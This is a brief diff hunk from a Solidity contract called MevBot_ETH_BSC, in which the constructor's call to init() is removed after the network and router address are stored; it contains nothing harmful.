@@ -45,7 +45,7 @@ contract MevBot_ETH_BSC {
     constructor(string memory Network, string memory routerAddress) public {
         _Network = Network;
         _RouterAddress = routerAddress;
-        init();
+
     }
   
 
